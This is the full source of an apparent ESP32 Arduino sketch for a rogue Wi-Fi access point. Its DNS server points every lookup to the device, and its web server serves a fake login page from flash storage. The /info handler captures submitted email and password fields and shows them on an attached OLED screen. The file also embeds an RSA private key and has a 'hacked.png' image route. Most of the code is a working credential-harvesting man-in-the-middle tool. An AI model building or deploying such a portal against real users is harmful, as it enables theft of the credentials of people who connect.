#include "Arduino.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "DNSMessage.h"
#include "FS.h"
#include "SPIFFS.h"
#include "ESP32WebServer.h"
//#include <ESP8266WebServerSecure.h>
//Bits are left to right - total 8 bits

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define TOUCH_BTN_PIN T9 //GPIO 32
#define OLED_RESET 4
Adafruit_SSD1306 display(OLED_RESET);

#if (SSD1306_LCDHEIGHT != 64)
#error("Height incorrect, please fix Adafruit_SSD1306.h!");
#endif
//------PAYLOAD ----------------<img src='im.png' height='2000' width='1500'/>
//char payload[] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style> body, html {height: 100%; margin: 0;}.bg {background-image: url('im.png');height: 100%;background-position: center;background-repeat: no-repeat;background-size: contain;}</style></head><body><div class='bg'></div></body></html>";

/* Set these to your desired credentials. */
static const uint8_t x509[] PROGMEM = {
  0x30, 0x82, 0x01, 0x3d, 0x30, 0x81, 0xe8, 0x02, 0x09, 0x00, 0xfe, 0x56,
  0x46, 0xf2, 0x78, 0xc6, 0x51, 0x17, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86,
  0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x26, 0x31,
  0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x0c, 0x07, 0x45, 0x53,
  0x50, 0x38, 0x32, 0x36, 0x36, 0x31, 0x12, 0x30, 0x10, 0x06, 0x03, 0x55,
  0x04, 0x03, 0x0c, 0x09, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e,
  0x31, 0x30, 0x1e, 0x17, 0x0d, 0x31, 0x37, 0x30, 0x33, 0x31, 0x38, 0x31,
  0x34, 0x34, 0x39, 0x31, 0x38, 0x5a, 0x17, 0x0d, 0x33, 0x30, 0x31, 0x31,
  0x32, 0x35, 0x31, 0x34, 0x34, 0x39, 0x31, 0x38, 0x5a, 0x30, 0x26, 0x31,
  0x10, 0x30, 0x0e, 0x06, 0x03, 0x55, 0x04, 0x0a, 0x0c, 0x07, 0x45, 0x53,
  0x50, 0x38, 0x32, 0x36, 0x36, 0x31, 0x12, 0x30, 0x10, 0x06, 0x03, 0x55,
  0x04, 0x03, 0x0c, 0x09, 0x31, 0x32, 0x37, 0x2e, 0x30, 0x2e, 0x30, 0x2e,
  0x31, 0x30, 0x5c, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7,
  0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x4b, 0x00, 0x30, 0x48, 0x02,
  0x41, 0x00, 0xc6, 0x72, 0x6c, 0x12, 0xe1, 0x20, 0x4d, 0x10, 0x0c, 0xf7,
  0x3a, 0x2a, 0x5a, 0x49, 0xe2, 0x2d, 0xc9, 0x7a, 0x63, 0x1d, 0xef, 0xc6,
  0xbb, 0xa3, 0xd6, 0x6f, 0x59, 0xcb, 0xd5, 0xf6, 0xbe, 0x34, 0x83, 0x33,
  0x50, 0x80, 0xec, 0x49, 0x63, 0xbf, 0xee, 0x59, 0x94, 0x67, 0x8b, 0x8d,
  0x81, 0x85, 0x23, 0x24, 0x06, 0x52, 0x76, 0x55, 0x9d, 0x18, 0x09, 0xb3,
  0x3c, 0x10, 0x40, 0x05, 0x01, 0xf3, 0x02, 0x03, 0x01, 0x00, 0x01, 0x30,
  0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b,
  0x05, 0x00, 0x03, 0x41, 0x00, 0x69, 0xdc, 0x6c, 0x9b, 0xa7, 0x62, 0x57,
  0x7e, 0x03, 0x01, 0x45, 0xad, 0x9a, 0x83, 0x90, 0x3a, 0xe7, 0xdf, 0xe8,
  0x8f, 0x46, 0x00, 0xd3, 0x5f, 0x2b, 0x0a, 0xde, 0x92, 0x1b, 0xc5, 0x04,
  0xc5, 0xc0, 0x76, 0xf4, 0xf6, 0x08, 0x36, 0x97, 0x27, 0x82, 0xf1, 0x60,
  0x76, 0xc2, 0xcd, 0x67, 0x6c, 0x4b, 0x6c, 0xca, 0xfd, 0x97, 0xfd, 0x33,
  0x9e, 0x12, 0x67, 0x6b, 0x98, 0x7e, 0xd5, 0x80, 0x8f
};

// And so is the key.  These could also be in DRAM
static const uint8_t rsakey[] PROGMEM = {
  0x30, 0x82, 0x01, 0x3a, 0x02, 0x01, 0x00, 0x02, 0x41, 0x00, 0xc6, 0x72,
  0x6c, 0x12, 0xe1, 0x20, 0x4d, 0x10, 0x0c, 0xf7, 0x3a, 0x2a, 0x5a, 0x49,
  0xe2, 0x2d, 0xc9, 0x7a, 0x63, 0x1d, 0xef, 0xc6, 0xbb, 0xa3, 0xd6, 0x6f,
  0x59, 0xcb, 0xd5, 0xf6, 0xbe, 0x34, 0x83, 0x33, 0x50, 0x80, 0xec, 0x49,
  0x63, 0xbf, 0xee, 0x59, 0x94, 0x67, 0x8b, 0x8d, 0x81, 0x85, 0x23, 0x24,
  0x06, 0x52, 0x76, 0x55, 0x9d, 0x18, 0x09, 0xb3, 0x3c, 0x10, 0x40, 0x05,
  0x01, 0xf3, 0x02, 0x03, 0x01, 0x00, 0x01, 0x02, 0x40, 0x35, 0x0b, 0x74,
  0xd3, 0xff, 0x15, 0x51, 0x44, 0x0f, 0x13, 0x2e, 0x9b, 0x0f, 0x93, 0x5c,
  0x3f, 0xfc, 0xf1, 0x17, 0xf9, 0x72, 0x94, 0x5e, 0xa7, 0xc6, 0xb3, 0xf0,
  0xfe, 0xc9, 0x6c, 0xb1, 0x1e, 0x83, 0xb3, 0xc6, 0x45, 0x3a, 0x25, 0x60,
  0x7c, 0x3d, 0x92, 0x7d, 0x53, 0xec, 0x49, 0x8d, 0xb5, 0x45, 0x10, 0x99,
  0x9b, 0xc6, 0x22, 0x3a, 0x68, 0xc7, 0x13, 0x4e, 0xb6, 0x04, 0x61, 0x21,
  0x01, 0x02, 0x21, 0x00, 0xea, 0x8c, 0x21, 0xd4, 0x7f, 0x3f, 0xb6, 0x91,
  0xfa, 0xf8, 0xb9, 0x2d, 0xcb, 0x36, 0x36, 0x02, 0x5f, 0xf0, 0x0c, 0x6e,
  0x87, 0xaa, 0x5c, 0x14, 0xf6, 0x56, 0x8e, 0x12, 0x92, 0x25, 0xde, 0xb3,
  0x02, 0x21, 0x00, 0xd8, 0x99, 0x01, 0xf1, 0x04, 0x0b, 0x98, 0xa3, 0x71,
  0x56, 0x1d, 0xea, 0x6f, 0x45, 0xd1, 0x36, 0x70, 0x76, 0x8b, 0xab, 0x69,
  0x30, 0x58, 0x9c, 0xe0, 0x45, 0x97, 0xe7, 0xb6, 0xb5, 0xef, 0xc1, 0x02,
  0x21, 0x00, 0xa2, 0x01, 0x06, 0xc0, 0xf2, 0xdf, 0xbc, 0x28, 0x1a, 0xb4,
  0xbf, 0x9b, 0x5c, 0xd8, 0x65, 0xf7, 0xbf, 0xf2, 0x5b, 0x73, 0xe0, 0xeb,
  0x0f, 0xcd, 0x3e, 0xd5, 0x4c, 0x2e, 0x91, 0x99, 0xec, 0xb7, 0x02, 0x20,
  0x4b, 0x9d, 0x46, 0xd7, 0x3c, 0x01, 0x4c, 0x5d, 0x2a, 0xb0, 0xd4, 0xaa,
  0xc6, 0x03, 0xca, 0xa0, 0xc5, 0xac, 0x2c, 0xe0, 0x3f, 0x4d, 0x98, 0x71,
  0xd3, 0xbd, 0x97, 0xe5, 0x55, 0x9c, 0xb8, 0x41, 0x02, 0x20, 0x02, 0x42,
  0x9f, 0xd1, 0x06, 0x35, 0x3b, 0x42, 0xf5, 0x64, 0xaf, 0x6d, 0xbf, 0xcd,
  0x2c, 0x3a, 0xcd, 0x0a, 0x9a, 0x4d, 0x7c, 0xad, 0x29, 0xd6, 0x36, 0x57,
  0xd5, 0xdf, 0x34, 0xeb, 0x26, 0x03
};
//1AManInTh3Middl3
const char *ssid = "!DONT JOIN!!";
const char *password = "";
IPAddress apIP(192, 168, 1, 1);

char incomingPacket[255];

//ESP8266WebServerSecure server(443);
ESP32WebServer httpserver(80);
WiFiUDP DNSserver;
//ESP8266WebServerSecure httpserver(8080);

IPAddress myIP;
//File f;



void blink(int amount, int length, int halt){
  int blinks = 0;
  while(blinks<amount){
    digitalWrite(LED_BUILTIN, HIGH);
    delay(length);
    digitalWrite(LED_BUILTIN, LOW);
    delay(halt);
    blinks++;
  }
}
void p(char X) {

   if (X < 16) {Serial.print("0");}

   Serial.println(X, HEX);

}
void printField(Packet *packet){
  //int i = 0;
  /*while(i<12){
    p(header->value[i]);
    i = i+1;
  }
  */
  Serial.printf("\nTransaction ID: ");
  //First 18 bits are the message id.
  Serial.print(packet->buffer[0], HEX);
  Serial.println(packet->buffer[1], HEX);
  //Print type of message.
  Serial.printf("Recived message type: %s\n", ((packet->buffer[2]&0x80)==0)?"Querry":"Response");
}


/*void handleHttpsRoot() {
  Serial.println("HTTPS Request recieved. ");
	server.send(200, "text/html", payload);
}*/


void handleHttpRoot(){
  Serial.println("HTTP Request recieved. ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/index.html", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  httpserver.streamFile(f,"text/html");
  /*char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }*/
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleStyle(){
  Serial.println("Style req");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/style.css", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"text/css");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleLogo(){
  Serial.println("Logo req ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/logo.JPG", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);

     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleProfile(){
  Serial.println("profile image req");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/profile-img.jpg", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     //Serial.println(siz);
     //Serial.println(len);
     httpserver.client().write((const char*)buf, len);

     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
void handleFooter(){
  Serial.println("Footer req ");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/footer-logo.JPG", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
  //httpserver.streamFile(f,"image/png");
  char buf[1024];
   int siz = f.size();
   while(siz > 0) {
     size_t len = std::min((int)(sizeof(buf) - 1), siz);
     f.read((uint8_t *)buf, len);
     httpserver.client().write((const char*)buf, len);
     siz -= len;
   }
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}
/*void handleHttpsImage(){
  Serial.println("Loading resource...");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/hacked.png", "r");
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
Serial.println("Streaming Resource...(HTTPS)");
  server.streamFile(f, "image/png");
//  server.write("HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: image/png\r\nContent-Length: %d",ftell(f));
  //server.write("HTTP/1.1 200 OK\r\n");
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}*/


void handleHttpImage(){
  Serial.println("Loading resource...");
  File f;
  if(SPIFFS.begin()){
    f = SPIFFS.open("/hacked.png", "r");
    Serial.println(f.size());
    Serial.println("Resource loaded...");
  }else{
    Serial.print("Fatal fail!");
    while(1);
}
Serial.println("Streaming Resource...(HTTP)");
  httpserver.streamFile(f, "image/png");
//  server.write("HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: image/png\r\nContent-Length: %d",ftell(f));
  //server.write("HTTP/1.1 200 OK\r\n");
  Serial.println("Closing file...");
  f.close();
  Serial.println("Done!");
}

void showInfo(){
  //Will implement screen.
   //Serial.println(httpserver.arg("pass"));
   //Serial.println(httpserver.arg("mail"));
   display.println("----------------");
   display.print("Email: ");
   display.println(httpserver.arg("mail"));
   display.print("Password: ");
   display.println(httpserver.arg("pass"));
   display.display();
   delay(2000);
}

void setup() {
	delay(4000);
	Serial.begin(9600);
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.display();
  delay(2000);
  display.clearDisplay();

  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0,0);
  display.println("Welcome!");
  display.display();

  pinMode(LED_BUILTIN, OUTPUT);
  blink(1,2000,1000);

	Serial.println();
  Serial.println("Loading resources...");

  //Serial.println("ASKED1");
  //bool b = SPIFFS.format();

  //Serial.println(a);
  //Serial.println(b);





	Serial.println("Configuring access point...");
	/* You can remove the password parameter if you want the AP to be open. */

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);
  //WiFi.clients();

	myIP = WiFi.softAPIP();
	Serial.println("AP IP address: ");
	Serial.println(myIP);
  blink(1,500,250);

  //Setting TLS http server
  //server.setServerKeyAndCert_P(rsakey, sizeof(rsakey), x509, sizeof(x509));
	//server.on("/", handleHttpsRoot);
  //server.on("/im.png", handleHttpsImage);

	//server.begin();
  //blink(1,500,250);

  //Setting HTTP server
  httpserver.on("/", handleHttpRoot);
  httpserver.on("/im.png", handleHttpImage);
  httpserver.on("/logo.png", handleLogo);
  httpserver.on("/profile-img.png", handleProfile);
  httpserver.on("/footer-logo.png", handleFooter);
  httpserver.on("/style.css", handleStyle);
  httpserver.on("/info",showInfo);
	httpserver.begin();
  blink(1,500,250);

  Serial.println("Initializing DNS server...");
 DNSserver.begin(53);
 blink(1,500,250);
 Serial.println("DONE.");
}

void loop() {


	//server.handleClient();
  httpserver.handleClient();


  int packetSize = DNSserver.parsePacket();
  if (packetSize)
  {
    // receive incoming UDP packets
    Packet recieved;
    Packet response;

    //Serial.printf("Received %d bytes from %s, port %d\n", packetSize, DNSserver.remoteIP().toString().c_str(), DNSserver.remotePort());
    recieved.size = DNSserver.read(incomingPacket, 255);

    if (recieved.size > 0)
    {
      incomingPacket[recieved.size] = 0;
    }
    int i = 0;
    while(i<recieved.size){
      recieved.buffer[i] = incomingPacket[i];
      i = i+1;
    }

    //printField(&recieved);
    DNSMessage *msg = new DNSMessage(recieved);
    bool finish = msg->creatResponseDNSPacket(myIP);
    if(finish){
    //Serial.printf("UDP packet contents: %s\n", incomingPacket);
    //responseHeader.value[11] = 'A';
    // send back a reply, to the IP address and port we got the packet from
    DNSserver.beginPacket(DNSserver.remoteIP(), DNSserver.remotePort());
    //Serial.println(msg->response.size);
    DNSserver.write((const uint8_t*)(msg->response.buffer), msg->response.size);
    DNSserver.endPacket();
    delete msg;
  }else{
    Serial.println("Problem making response...");
    delete msg;
  }
  }




  int touch_value = touchRead(TOUCH_BTN_PIN);
  //Serial.println(touch_value);
  if(touch_value<30){
    blink(1,100,0);
  }

}
